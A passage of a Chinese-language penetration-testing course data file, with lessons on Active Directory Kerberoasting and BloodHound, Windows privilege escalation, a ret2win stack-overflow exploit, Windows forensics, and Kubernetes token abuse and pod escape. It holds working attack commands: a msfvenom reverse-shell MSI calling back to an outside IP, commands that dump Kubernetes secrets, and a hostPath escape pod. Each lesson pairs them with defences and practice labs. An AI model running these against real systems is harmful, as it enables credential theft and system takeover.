+    {t:'ACL 与路径', d:'域里真正致命的常常不是「谁是管理员」，而是「谁对谁有 GenericAll / WriteDACL 权限」。BloodHound 就是把这张权限图变成攻击路径。'}
+  ],
+  steps:[
+    {title:'先摸清域的结构',
+     cmd:`nxc smb 10.10.10.0/24
+ldapsearch -x -H ldap://10.10.10.10 -D "user@corp.local" -w 'Passw0rd' \\
+  -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName`,
+     why:'先知道域叫什么、DC 是哪台、有哪些用户与组。LDAP 是域的「电话簿」，匿名或低权限账号常常就能读出大量结构信息。',
+     out:'域名、DC 主机名、用户与组列表。',
+     hints:['nxc 的 --users / --groups / --pass-pol 可以直接列出用户、组和密码策略。','密码策略决定你能不能爆破，先看锁定阈值。']},
+    {title:'Kerberoasting：申请票据，回家慢慢猜',
+     cmd:`GetUserSPNs.py corp.local/user:Passw0rd -dc-ip 10.10.10.10 -request
+hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt`,
+     why:'为带 SPN 的账号申请票据，票据用该账号的 NTLM 哈希加密。拿回来离线爆破，不会触发账号锁定、也不产生登录失败日志——所以它是最隐蔽的 AD 攻击之一。',
+     out:'一条 $krb5tgs$ 开头的哈希，爆破后得到服务账号明文。',
+     hints:['服务账号常用弱口令且很少改，是首选目标。','hashcat 模式号 13100 对应 Kerberoast（RC4）。'],
+     try:{need:['-m','13100'], hint:'爆破这种票据要用 hashcat 的 13100 模式。'}},
+    {title:'AS-REP Roasting：不需要密码也能要票据',
+     cmd:`GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -no-pass -format hashcat
+hashcat -m 18200 asrep.hash rockyou.txt`,
+     why:'如果账号关闭了「需要 Kerberos 预认证」，任何人不用密码就能拿到一段用其密码加密的数据，同样可以离线爆破。这是配置疏忽直接变成漏洞的典型。',
+     out:'一个 $krb5asrep$ 哈希，爆破得到明文。',
+     hints:['先枚举出「不需要预认证」的账号：nxc ldap --asreproast。','模式号 18200。']},
+    {title:'BloodHound：把权限画成图',
+     cmd:`bloodhound-python -u user -p 'Passw0rd' -d corp.local -ns 10.10.10.10 -c All
+# 启动 bloodhound，导入 zip，运行预置查询：
+# Shortest Paths to Domain Admins from Owned Principals`,
+     why:'人脑记不住几万个 ACL 关系，图数据库可以。你标出「已控制」的账号，它直接算出到 Domain Admins 的最短路径，包括 GenericAll、WriteDACL、ForceChangePassword 这类隐蔽边。',
+     out:'一张从当前账号到域管的最短路径图，每跳都标了利用方式。',
+     hints:['先跑 All 收集，再按 Owned 迭代——每拿下一个账号就重新算一次。','看到 GenericAll 就想「改密码 / 加组」，看到 WriteDACL 就想「给自己授权」。']},
+    {title:'防守：把这三条路堵住',
+     cmd:`# 1) 服务账号用 gMSA 或 25 位以上随机密码，定期轮换
+# 2) 禁用 RC4（Kerberoast 主要打 RC4），强制 AES
+# 3) 清理不需要预认证的账号，监控 4769 / 4625
+# 4) 定期跑 BloodHound 看自己有没有「意外的路径」`,
+     why:'这三条攻击都依赖「弱口令 / 错误配置 / 过度授权」。防守方用自己的工具跑一遍攻击路径，比等别人来打要划算得多——这叫攻击面管理。',
+     out:'一份可执行的 AD 加固清单 + 每月一次的路径复核。',
+     hints:['监控 4769（请求服务票据）异常量，是检测 Kerberoast 的主要手段。','域管账号绝不登录普通工作站，能切断大量横向路径。']}
+  ],
+  deep:[
+    {t:'为什么票据能被离线爆破', d:'KDC 用服务账号的密钥加密票据，客户端拿到就能带走。破解在本地进行，域控完全看不到，所以「没有失败登录日志」并不代表没被攻击。'},
+    {t:'ACL 比组成员更危险', d:'组成员关系大家都会看，ACL 几乎没人审计。GenericAll、WriteOwner、AddMember 这些权限可以悄悄把普通用户变成管理员。'},
+    {t:'为什么拿下 DC 就结束了', d:'DC 持有所有账号哈希（DCSync 可直接同步），控制 DC 等于可以伪造任意身份的票据（黄金票据），整个域的信任链都归你。'}
+  ],
+  labs:[
+    {name:'TryHackMe · Attacktive Directory', task:'完整走一遍枚举 → AS-REP → Kerberoast → 提权到域管，记录每一步的命令与输出摘要。'},
+    {name:'GOAD / HTB Forest', task:'在自己搭的域环境里用 BloodHound 找到一条 3 跳以内的域管路径，并实际打通。'},
+    {name:'本地 AD（可选）', task:'用 Windows Server 评估版 + 两台 Win10 搭最小域，故意配一个弱口令服务账号，验证 Kerberoast 能否成功。'}
+  ],
+  pitfalls:[
+    '在生产域大规模 Kerberoast，触发大量 4769 告警。',
+    '不看密码策略就爆破，直接把域账号锁死、业务中断。',
+    '只盯组成员，忽略 ACL，错过最短路径。'
+  ],
+  quiz:{q:'Kerberoasting 为什么很难被传统登录日志发现？',
+    opts:['因为它不发送网络包','因为破解在本地离线进行，域控只看到一次正常的票据请求，没有失败登录','因为它用了加密','因为它只针对 Linux'],
+    a:1, exp:'票据请求本身是合法操作，爆破完全离线。检测要靠 4769 的异常频率与 RC4 票据比例，而不是失败登录。'},
+  challenge:[
+    '写一个脚本，从 LDAP 导出所有带 SPN 的账号，按「密码最后设置时间」排序，输出最可能被 Kerberoast 成功的 10 个。',
+    '用 BloodHound 的原始数据（JSON）自己写一条 Cypher 查询，找出所有对 Domain Admins 组有 WriteMember 权限的非管理员账号。'
+  ]
+}
+],
+'m5': [
+{
+  id:'l5-3', title:'Windows 提权：令牌、服务与注册表里的机会', time:'50 分钟', level:'高级',
+  tags:['Windows','提权','令牌','服务','winPEAS'],
+  goal:[
+    '用 whoami /priv 与 systeminfo 判断当前权限画像',
+    '找出「未引用服务路径」与 AlwaysInstallElevated 两类经典配置漏洞',
+    '理解为什么 Windows 提权大多是「配置问题」而不是「内核漏洞」'
+  ],
+  concepts:[
+    {t:'令牌', d:'Windows 用访问令牌表示身份与特权。SeImpersonatePrivilege 这类特权可以被滥用成 SYSTEM（Potato 系列），所以「服务账号」天然危险。'},
+    {t:'未引用服务路径', d:'服务路径写成 C:\\Program Files\\App\\svc.exe 却没加引号，Windows 会依次尝试 C:\\Program.exe、C:\\Program Files\\App.exe——你在这些位置放个同名程序，就以 SYSTEM 执行了。'},
+    {t:'AlwaysInstallElevated', d:'组策略允许普通用户以高权限安装 msi，于是构造一个恶意 msi 就能拿到 SYSTEM。'}
+  ],
+  steps:[
+    {title:'先画权限画像',
+     cmd:`whoami /priv
+whoami /groups
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+net user %USERNAME%`,
+     why:'先看有没有 SeImpersonate、SeAssignPrimaryToken、SeBackup 这类高价值特权，再看系统补丁版本决定能不能打内核漏洞，最后看自己在哪些组（Backup Operators 也能读 SAM）。',
+     out:'特权列表 + 系统版本 + 所属组。',
+     hints:['SeImpersonatePrivilege 存在就先试 PrintSpoofer / GodPotato，成功率高、动静小。','补丁列表缺失的服务（如 MS16-032）对应一串可用 exploit。'],
+     try:{need:['whoami','/priv'], hint:'查看当前令牌特权的命令。'}},
+    {title:'未引用服务路径：把程序放到它「先找」的位置',
+     cmd:`wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\"
+# 或用 PowerUp：Get-UnquotedService`,
+     why:'输出里带空格且没加引号的路径就是候选。你要确认那个「中间路径」目录你是否有写权限——有，就能放一个同名 exe，等服务重启时以 SYSTEM 身份执行。',
+     out:'一条形如 C:\\Program Files\\Vuln App\\service.exe 的可疑路径。',
+     hints:['用 accesschk 检查目录权限：accesschk.exe -uwdqs "C:\\Program Files"。','重启服务需要权限，通常要等系统重启或配合其他手段。']},
+    {title:'AlwaysInstallElevated：两个注册表键都开就完事',
+     cmd:`reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+# 两个都是 0x1 时：
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi
+msiexec /quiet /qn /i evil.msi`,
+     why:'这是纯配置错误：只要两处都开启，任何用户安装 msi 都会以 SYSTEM 权限运行其中的自定义动作。你不需要漏洞，只需要一个「合法的安装包」。',
+     out:'两个键都返回 0x1；执行 msi 后拿到 SYSTEM 的反弹 shell。',
+     hints:['只有 HKCU 开启不算，必须是 HKLM 与 HKCU 同时开启。','这是 MSF 里最稳的提权模块之一：exploit/windows/local/always_install_elevated。']},
+    {title:'让工具把剩下的翻完',
+     cmd:`winPEASx64.exe > peas.txt
+# 或 PowerUp：Invoke-AllChecks
+# 关注：可写服务目录、计划任务、ModifiableServices、凭据文件`,
+     why:'人工翻几十个点容易漏。winPEAS 会把服务权限、计划任务、注册表、凭据、补丁一次性列出来，并用颜色标风险。你的工作是复核最红的那几条，而不是从头读到尾。',
+     out:'一份按风险排序的提权候选清单。',
+     hints:['先看红色项，再看橙色项；蓝色多是信息性内容。','工具会留下文件，注意清理。']},
+    {title:'防守：把「可写的路径」全部收掉',
+     cmd:`# 1) 服务路径全部加引号，安装目录不给普通用户写权限
+# 2) 关闭 AlwaysInstallElevated（两处都要关）
+# 3) 服务账号降权，能不用 SYSTEM 就不用
+# 4) AppLocker / WDAC 限制可执行位置`,
+     why:'Windows 提权的绝大多数入口是「低权限用户能写一个会被高权限执行的位置」。把这个交集清空，攻击者就没有落脚点——这比追着每个 CVE 打补丁更根本。',
+     out:'同样的提权尝试全部失败。',
+     hints:['定期用 accesschk 扫描「Everyone 可写」的服务目录。','别给普通用户本地管理员，很多提权链从这一步就断了。']}
+  ],
+  deep:[
+    {t:'为什么 SeImpersonate 等于半个 SYSTEM', d:'拥有模拟特权就能「借用」其他进程的令牌。Potato 系列通过本地 RPC 让 SYSTEM 进程来连接你，你模拟它，就变成了 SYSTEM。'},
+    {t:'内核漏洞 vs 配置漏洞', d:'内核漏洞要匹配版本、容易蓝屏；配置漏洞稳定、可复现。真实项目里后者占比更高，也更值得先查。'},
+    {t:'UAC 不是安全边界', d:'UAC 只是提示，不是权限隔离。管理员组的用户被 UAC 限制时，仍有大量 auto-elevate 的 COM 接口可被利用（UACME）。'}
+  ],
+  labs:[
+    {name:'TryHackMe · Windows Privilege Escalation', task:'完成房间里的全部提权任务，每完成一个就写下「漏洞类型 + 关键命令 + 修复建议」。'},
+    {name:'HackTheBox · 任选一台 Windows Easy', task:'从初始 shell 提到 Administrator，全程只用 3 个工具（winPEAS + 一个 exploit + 一个上传方式）。'},
+    {name:'Metasploitable 3 (Windows)', task:'搭起来后练未引用服务路径与 AlwaysInstallElevated 两条链。'}
+  ],
+  pitfalls:[
+    '一上来就打内核 exploit，蓝屏把靶机搞挂，还得重装。',
+    '只看服务路径不看目录权限，白高兴一场。',
+    '提权后立刻建账号，留下明显痕迹。'
+  ],
+  quiz:{q:'「未引用服务路径」漏洞成立的必要条件是？',
+  opts:['服务以 SYSTEM 运行，且路径含空格未加引号，且低权限用户对某个中间路径有写权限','只要路径含空格即可','只要服务以 SYSTEM 运行即可','必须有内核漏洞配合'],
+  a:0, exp:'三个条件缺一不可：高权限运行、路径可被拆分、你能在拆分出的某个位置写入同名程序。修复只需给路径加引号，但要彻底还得收掉写权限。'},
+  challenge:[
+    '写一个 PowerShell 脚本，自动找出所有「Auto 启动 + 路径含空格 + 无引号 + 中间目录可写」的服务。',
+    '对比 winPEAS 与 PowerUp 的检测结果，统计各自的误报与漏报。'
+  ]
+}
+],
+'m6': [
+{
+  id:'l6-3', title:'Pwn 入门：从栈溢出到控制 RIP', time:'60 分钟', level:'高级',
+  tags:['Pwn','栈溢出','pwntools','ROP'],
+  goal:[
+    '看懂栈帧布局与「覆盖返回地址」的原理',
+    '用 cyclic 精确算出偏移量',
+    '写出第一个 ret2win 利用脚本'
+  ],
+  concepts:[
+    {t:'栈帧', d:'函数调用时，返回地址被压在栈上。局部缓冲区溢出会一路写上去，把返回地址覆盖成你想要的地址。'},
+    {t:'偏移', d:'从缓冲区开头到返回地址的距离。算错一个字节，程序就跳到垃圾地址崩溃——所以要用 cyclic 图案精确定位。'},
+    {t:'ret2win', d:'不开 NX 也能用、开了 NX 也能用：不注入 shellcode，而是直接返回到程序里已有的 win() 函数。Pwn 的第一课。'}
+  ],
+  steps:[
+    {title:'先看保护，决定打法',
+     cmd:`checksec --file=./vuln
+file ./vuln`,
+     why:'NX 开着就不能在栈上执行代码，得走 ROP；PIE 开着地址随机，需要泄露基址；Canary 开着要先绕过或泄露。保护组合决定了你接下来写哪种 exploit。',
+     out:'一列 Yes/No：RELRO / Canary / NX / PIE。',
+     hints:['ret2win 只需要「有 win 函数 + 能控制返回地址」，NX 和 PIE 关不关都能打。','32 位与 64 位传参方式不同，别混。'],
+     try:{need:['checksec'], hint:'看二进制保护机制的工具。'}},
+    {title:'找溢出点',
+     cmd:`objdump -d ./vuln | grep -A20 "<main>:"
+# 或 gdb 里 disassemble main，找 gets / strcpy / read 的调用`,
+     why:'gets、strcpy、sprintf 不做长度检查，是最经典的溢出源。看到 gets 就基本可以确定：缓冲区多大、要覆盖多少字节，都能从反汇编里读出来。',
+     out:'一个栈缓冲区大小，例如 sub rsp, 0x40。',
+     hints:['32 位下 buffer 到 ebp 的距离 + 4 字节 saved ebp 就是偏移。','64 位还要考虑 rbp，通常是 buffer 大小 + 8。']},
+    {title:'用 cyclic 算出精确偏移',
+     cmd:`gdb -q ./vuln
+(gdb) cyclic 200
+(gdb) run            # 输入那串图案
+(gdb) info registers rip
+(gdb) cyclic -l 0x6161616c`,
+     why:'cyclic 生成一段「每 4 字节都不重复」的图案，崩溃时 RIP 里的值就能反查出它在图案中的位置——那就是偏移量。这是 Pwn 里最重要的一次测量。',
+     out:'一个数字，例如 72，表示第 73 个字节开始覆盖返回地址。',
+     hints:['装 pwndbg 后崩溃会直接提示 offset，省一步。','32 位看 EIP，64 位看 RIP。'],
+     try:{need:['cyclic'], hint:'pwndbg / pwntools 里生成定位图案的命令。'}},
+    {title:'写第一个 exploit',
+     cmd:`from pwn import *
+elf = ELF('./vuln')
+p = process('./vuln')
+payload = b'A'*72 + p64(elf.symbols['win'])
+p.sendline(payload)
+p.interactive()`,
+     why:'72 个填充字节走完缓冲区，第 73 字节起就是返回地址，把它换成 win 的地址。程序 ret 时就跳到 win，你就拿到了 shell 或 flag。',
+     out:'打印出 win 函数里的内容，或直接得到 shell。',
+     hints:['p64 是 8 字节小端打包，32 位用 p32。','地址里有 0x0a 会被换行截断，必要时换输入方式（send 而不是 sendline）。'],
+     try:{need:['p64'], hint:'pwntools 里打包 64 位地址的函数。'}},
+    {title:'为什么 ret2win 开了 NX 也照样成立',
+     cmd:`# NX 只禁止「执行栈上的数据」，不禁止「跳到已有代码」
+# 返回到程序自带的 system("/bin/sh") 或 win() 完全合法`,
+     why:'很多人以为 NX 让 Pwn 变难了，其实 NX 只堵住「注入 shellcode」这一条路。代码复用（ret2win、ROP）利用的是程序自身的指令，NX 管不着——这就是为什么 ROP 成为主流。',
+     out:'能解释 NX / PIE / Canary 各自堵住了哪条路。',
+     hints:['PIE 才是真正麻烦的那个，它让地址每次运行都变，必须先泄露。','Canary 需要先泄露或暴力猜（fork 服务可以逐字节爆破）。']},
+    {title:'防守：编译选项与运行时防护',
+     cmd:`gcc -fstack-protector-strong -fPIE -pie -Wl,-z,relro,-z,now -D_FORTIFY_SOURCE=2
+# 再配合 ASLR 与 seccomp 白名单`,
+     why:'编译期加保护、运行期加沙箱，两层叠加能挡住绝大多数入门级 Pwn。真正的工业级防御还要有 CFI、内存安全语言（Rust）这类结构性方案。',
+     out:'同样的 exploit 在新编译版本上失败。',
+     hints:['-D_FORTIFY_SOURCE=2 能把 gets 这类函数直接编译报错。','不要把「能打通」当成「系统不安全」，要看目标环境开了什么。']}
+  ],
+  deep:[
+    {t:'为什么 64 位要 8 字节对齐', d:'x86-64 的栈按 16 字节对齐，movaps 指令遇到未对齐会崩。写 ROP 时经常要多加一个 ret 做对齐，这是新手最常见的「本地能通、远程崩」。'},
+    {t:'Canary 的两条绕过思路', d:'泄露（格式化字符串、越界读）或爆破（fork 子进程 canary 不变，可逐字节猜，最多 7×256 次）。'},
+    {t:'从 ret2win 到 ROP 的跨越', d:'当没有现成的 win 函数时，用一个个 ret 结尾的小片段（gadget）拼出 pop rdi; ret 加 system 加 /bin/sh 的调用序列——本质是「用已有指令编程」。'}
+  ],
+  labs:[
+    {name:'ROP Emporium · ret2win', task:'下载 32 位与 64 位两个版本，各写一份 pwntools 脚本，理解两者偏移与打包的差异。'},
+    {name:'pwn.college · Program Misuse / Memory Safety', task:'完成前两个模块，用课程环境练 gdb 与内存布局。'},
+    {name:'本地练习', task:'自己写一个带 gets 的 C 程序，编译两次（开/关保护），分别打通并对比。'}
+  ],
+  pitfalls:[
+    '偏移算成缓冲区大小，忘了 saved rbp，永远差 8 字节。',
+    '本地打通远程崩，多数是栈对齐或 libc 版本不同。',
+    '不关 ASLR 就本地调试，地址每次都变。'
+  ],
+  quiz:{q:'开启 NX 之后，为什么 ret2win 依然能成功？',
+  opts:['因为 NX 只对 32 位有效','因为 NX 只禁止执行栈上的数据，而 ret2win 是跳转到程序已有的代码','因为 NX 可以被 gdb 关闭','因为 ret2win 不修改返回地址'],
+  a:1, exp:'NX 阻止的是「把数据当代码执行」，代码复用攻击用的是程序自身的指令段，不受影响。这也是 ROP 成为主流的原因。'},
+  challenge:[
+    '把 ret2win 升级成 ret2libc：没有 win 函数时，泄露 libc 基址，再调用 system("/bin/sh")。',
+    '给练习程序加上 Canary，写脚本用逐字节爆破绕过（fork 模式）。'
+  ]
+}
+],
+'m7': [
+{
+  id:'l7-3', title:'Windows 取证：注册表、事件日志与执行痕迹', time:'45 分钟', level:'高级',
+  tags:['Windows','注册表','EVTX','ShimCache'],
+  goal:[
+    '离线挂载注册表 hive 并定位持久化项',
+    '解析关键事件 ID，重建登录与进程执行记录',
+    '用 ShimCache / Amcache 证明「某程序确实运行过」'
+  ],
+  concepts:[
+    {t:'Hive', d:'注册表在磁盘上是几个文件：SAM、SYSTEM、SOFTWARE、NTUSER.DAT。拷贝出来就能离线分析，不需要启动系统。'},
+    {t:'关键事件 ID', d:'4624 登录成功、4625 失败、4688 进程创建、7045 服务安装、1102 日志被清空。这几个 ID 撑起攻击时间线的主干。'},
+    {t:'执行痕迹', d:'ShimCache 记录「存在过/可能执行过」，Amcache 记录「安装/首次运行」，Prefetch 记录「运行过几次、加载了哪些文件」。三者互补。'}
+  ],
+  steps:[
+    {title:'先把 hive 拷出来，离线挂载',
+     cmd:`reg save HKLM\\SYSTEM C:\\case\\SYSTEM.hiv
+reg load HKLM\\CASE_SYS C:\\case\\SYSTEM.hiv
+reg query HKLM\\CASE_SYS\\ControlSet001\\Services /s | findstr /i "ImagePath"
+reg unload HKLM\\CASE_SYS`,
+     why:'reg save 可以做在线导出（取证时注意会改动少量元数据，严谨场景用镜像离线取）。reg load 让你在分析机上像读本地注册表一样读它——服务、驱动、启动项全在里面。',
+     out:'一份服务与驱动的 ImagePath 列表，异常路径往往就在里面。',
+     hints:['镜像环境用 Registry Explorer 更安全，不会改动原始文件。','CurrentControlSet 对应 ControlSet001，别找错分支。']},
+    {title:'看持久化：Run 键、服务、计划任务',
+     cmd:`# 常见位置
+HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+HKLM\\SYSTEM\\CurrentControlSet\\Services
+C:\\Windows\\System32\\Tasks\\`,
+     why:'攻击者要「重启后还在」，就必须落在这些位置之一。检查思路是「对比基线」：干净镜像里有哪些项，现在多了哪些。多出来的那条通常就是答案。',
+     out:'一条指向临时目录或混淆命名的启动项。',
+     hints:['注意同名但路径奇怪的项，比如 svch0st.exe。','服务的 ImagePath 指向 C:\\Users\\Public 是强信号。']},
+    {title:'事件日志：把行为串成时间线',
+     cmd:`wevtutil epl Security C:\\case\\security.evtx
+# 用 EvtxECmd 或 python-evtx 解析后过滤：
+# 4624 登录（关注 LogonType 3/10）
+# 4688 进程创建（看父进程与命令行）
+# 7045 服务安装（新服务名 + 可疑路径）`,
+     why:'4688 加上命令行审计，几乎就是「谁在什么时候运行了什么」。7045 是新服务被安装——很多持久化和提权都走这条路。4624 的 LogonType 能区分本地登录、网络登录、远程桌面。',
+     out:'一张按时间排序的登录与进程创建表。',
+     hints:['命令行审计默认不开，需要组策略启用，取证时要先确认有没有数据。','1102 出现表示日志被清空，这本身就是一条高价值线索。']},
+    {title:'证明「这个程序跑过」',
+     cmd:`# ShimCache：SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache
+# Amcache：C:\\Windows\\AppCompat\\Programs\\Amcache.hve
+# Prefetch：C:\\Windows\\Prefetch\\*.pf
+PECmd.exe -d C:\\Windows\\Prefetch --csv C:\\case\\prefetch`,
+     why:'攻击者可以删除 exe，但很难同时清掉这三处痕迹。Prefetch 还带运行次数与最后运行时间，是「是否执行」最直接的证据。',
+     out:'程序名、路径、运行次数、最后运行时间。',
+     hints:['Prefetch 默认开启，SSD 环境下可能被禁用，别因为看不到就以为没运行。','Amcache 还带文件哈希，可以直接拿去威胁情报比对。']},
+    {title:'输出：一份能被人看懂的取证结论',
+     cmd:`# 结论格式：时间 | 主机 | 行为 | 证据来源 | 置信度
+# 例：2026-10-30 02:14 | WS-01 | 安装可疑服务 UpdaterSvc | 7045 + Services 注册表 | 高`,
+     why:'取证的价值不在于你找到了多少 artifact，而在于能否用证据回答「发生了什么、影响多大、还会不会再来」。每条结论都要能指回原始证据。',
+     out:'一份含时间线与证据引用的简短报告。',
+     hints:['置信度分级能帮读者理解不确定性，别把推测写成事实。','把关键截图的哈希记下来，防止被质疑篡改。']}
+  ],
+  deep:[
+    {t:'为什么时间戳不可全信', d:'攻击者可以用 timestomp 改文件时间。所以要交叉验证：注册表、日志、Prefetch 三处时间一致才可信。'},
+    {t:'Volume Shadow Copy 的价值', d:'卷影副本里可能保留入侵前的干净版本，既能找回被删文件，也能做「前后对比」——这是最有力的取证手段之一。'},
+    {t:'日志被清空怎么办', d:'转向 Sysmon、EDR、网络设备日志、以及文件系统痕迹（USN Journal）。单一数据源永远不够。'}
+  ],
+  labs:[
+    {name:'CyberDefenders · Windows 内存/磁盘挑战', task:'任选一个 Windows 取证挑战，输出完整时间线与 5 条结论，每条附证据来源。'},
+    {name:'Blue Team Labs Online · Phishing/Endpoint', task:'完成一个终端分析挑战，重点练 4688 与 Prefetch 的交叉验证。'},
+    {name:'自建实验', task:'在 Win10 虚拟机里用 PowerShell 起一个计划任务，然后只用注册表 + 事件日志 + Prefetch 把这次操作还原出来。'}
+  ],
+  pitfalls:[
+    '只看一个数据源就下结论，被 timestomp 骗过。',
+    '忘记时区，时间线整体偏移 8 小时。',
+    '直接在生产机器上跑解析工具，破坏原始证据。'
+  ],
+  quiz:{q:'要证明「某个 exe 确实被执行过」，最有力的组合是？',
+  opts:['文件还在磁盘上','Prefetch 运行记录 + 4688 进程创建 + ShimCache/Amcache 交叉印证','文件名看起来可疑','杀毒软件报过警'],
+  a:1, exp:'文件存在不等于执行过。Prefetch 给运行次数与时间，4688 给进程链，ShimCache/Amcache 给存在与安装痕迹，三者交叉才能下结论。'},
+  challenge:[
+    '写一个 PowerShell 脚本，自动从 hive 中导出所有 Run 键与服务项，并与一份基线清单做 diff。',
+    '拿一个公开的取证镜像，用 EvtxECmd + PECmd + Registry Explorer 独立还原攻击链，再和官方答案对比差异。'
+  ]
+}
+],
+'m8': [
+{
+  id:'l8-3', title:'Kubernetes 安全：从一个 Pod 到整个集群', time:'50 分钟', level:'高级',
+  tags:['K8s','ServiceAccount','RBAC','逃逸'],
+  goal:[
+    '理解 ServiceAccount Token 为什么是集群里的「万能钥匙」',
+    '用 token 调 API 枚举权限、读 Secret',
+    '说清 hostPath / privileged 如何从 Pod 逃到节点'
+  ],
+  concepts:[
+    {t:'SA Token', d:'每个 Pod 都会自动挂载一个 token，代表它的身份。token 的权限由 RBAC 决定——但很多默认配置给得太宽。'},
+    {t:'RBAC', d:'Role/ClusterRole 定义「能对什么资源做什么动作」。一个 list secrets 权限就等于能读全集群的密码。'},
+    {t:'Pod 逃逸', d:'privileged、hostPath 挂载 /、hostPID/hostNetwork，都会让容器看到并影响宿主机。容器不是沙箱。'}
+  ],
+  steps:[
+    {title:'进 Pod 第一件事：看自己是谁',
+     cmd:`cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+env | grep KUBERNETES`,
+     why:'token 就是身份凭证。拿到它，你就不在容器里了——你在集群的 API 里。先确认命名空间，再确认能用这个 token 做什么。',
+     out:'一段 JWT 形式的 token，以及当前 namespace。',
+     hints:['token 是 JWT，可以解出 iss 与 sub 看它属于哪个 SA。','新版集群可能用投射卷，路径略有不同。'],
+     try:{need:['serviceaccount'], hint:'默认凭证挂载目录在 /var/run/secrets/ 下。'}},
+    {title:'用 token 问 API：我能做什么',
+     cmd:`TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+APISERVER=https://kubernetes.default.svc
+curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\
+  -H "Authorization: Bearer $TOKEN" $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \\
+  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'`,
+     why:'SelfSubjectRulesReview 直接告诉你「这个身份能对哪些资源做哪些动作」。比盲试快得多，也不会产生大量失败审计日志。',
+     out:'一份规则列表，可能包含 get/list secrets、create pods 等高危权限。',
+     hints:['能 create pods 就能起一个挂载 hostPath 的 Pod，等于拿到节点。','能 list secrets 就直接把全集群凭据读走。']},
+    {title:'读 Secret：集群里的密码本',
+     cmd:`curl -s -H "Authorization: Bearer $TOKEN" \\
+  $APISERVER/api/v1/namespaces/default/secrets | head -40
+# 单个 secret：
+curl -s -H "Authorization: Bearer $TOKEN" \\
+  $APISERVER/api/v1/namespaces/default/secrets/db-secret -o s.json
+cat s.json | python3 -c "import sys,json,base64;d=json.load(sys.stdin)['data'];print({k:base64.b64decode(v).decode() for k,v in d.items()})"`,
+     why:'Secret 只是 base64，不是加密。任何有读权限的身份都能还原出明文——数据库密码、API Key、TLS 私钥都在这里。所以「谁能读 Secret」是集群里最关键的权限边界。',
+     out:'一组明文凭据。',
+     hints:['有些集群开了 etcd 加密，那是另一层保护，但 API 层读出来仍是明文。','注意 400/403 的区别：403 是权限不足，400 是请求格式错。']},
+    {title:'从 Pod 到节点：两条常见逃逸路',
+     cmd:`# 1) hostPath 挂载 /
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: Pod
+spec:
+  containers:
+  - name: p
+    image: alpine
+    command: ["/bin/sh","-c","chroot /host sh"]
+    volumeMounts:
+    - name: h
+      mountPath: /host
+  volumes:
+  - name: h
+    hostPath: {path: /}
+EOF
+# 2) privileged + nsenter 进宿主命名空间`,
+     why:'只要你能创建 Pod 并挂载宿主目录，就能 chroot 到节点文件系统，读取 kubelet 凭据、其他容器数据，甚至控制整个节点。这已经不是「容器漏洞」，是权限设计问题。',
+     out:'在 Pod 里看到节点根文件系统，或直接进入宿主命名空间。',
+     hints:['PSA（Pod Security Admission）设为 restricted 就能挡住这类 Pod。','privileged 容器里可以直接 mount 宿主磁盘。']},
+    {title:'防守：把「默认宽权限」改成「显式最小」',
+     cmd:`# 1) automountServiceAccountToken: false（不需要 API 的 Pod）
+# 2) RBAC 按命名空间授权，禁止 cluster-admin 泛滥
+# 3) PSA restricted：禁止 privileged / hostPath / root
+# 4) NetworkPolicy 默认拒绝，Secret 开 etcd 加密
+# 5) 开审计日志，监控 exec / create pods / secrets 访问`,
+     why:'K8s 的默认值偏向「能用」，不是「安全」。所以防守是一系列显式收窄：关掉不需要的 token、按命名空间授权、用策略拒绝危险 Pod。审计日志则让你事后能回答「谁在什么时候读了 secret」。',
+     out:'同样的逃逸尝试被准入策略拒绝。',
+     hints:['先盘点有多少 SA 绑定了 cluster-admin，这个数字通常吓人。','别只做网络策略，RBAC 才是权限边界。']}
+  ],
+  deep:[
+    {t:'为什么 token 泄露等于集群沦陷', d:'token 是长期有效的身份凭证（旧版本不过期），拿到就能在集群内以该身份任意调用 API，不依赖网络位置。'},
+    {t:'容器隔离的边界在哪', d:'共享内核意味着内核漏洞可以跨容器；而 privileged / hostPath 是「主动把边界拆掉」，比漏洞更容易被利用。'},
+    {t:'为什么 PSA 比自定义 webhook 更该先上', d:'内置、零维护、覆盖最常见的危险配置。自定义准入控制用于补充业务规则，不该拿来做基础防护。'}
+  ],
+  labs:[
+    {name:'Kubernetes Goat', task:'完成 3 个场景：SA token 滥用、RBAC 越权、hostPath 逃逸，每个都写下「前提条件 + 修复配置」。'},
+    {name:'Killercoda · K8s 免费集群', task:'在在线集群里创建一个受限 SA，验证它在别的命名空间读 secret 会被拒绝。'},
+    {name:'自建 k3s', task:'装一个单节点 k3s，故意配一个 cluster-admin 的 SA，然后用 token 从 Pod 内读全集群 secret。'}
+  ],
+  pitfalls:[
+    '把 kubeconfig 提交到 Git 仓库，等于把集群钥匙公开。',
+    '给所有 CI 用的 SA 绑 cluster-admin，图省事。',
+    '只做网络策略，不做 RBAC，权限照样越界。'
+  ],
+  quiz:{q:'Pod 内的 ServiceAccount Token 泄露后，最严重的直接后果是？',
+  opts:['容器会重启','攻击者可以以该身份调用 K8s API，按 RBAC 权限读 Secret 或创建 Pod','节点会宕机','镜像会被删除'],
+  a:1, exp:'token 是集群内的身份凭证。权限多大，危害就多大——能读 Secret 就等于拿到全集群凭据，能建 Pod 就可能逃逸到节点。'},
+  challenge:[
+    '写一个脚本：给定 token，自动枚举权限并输出「最高危的三条路径」。',
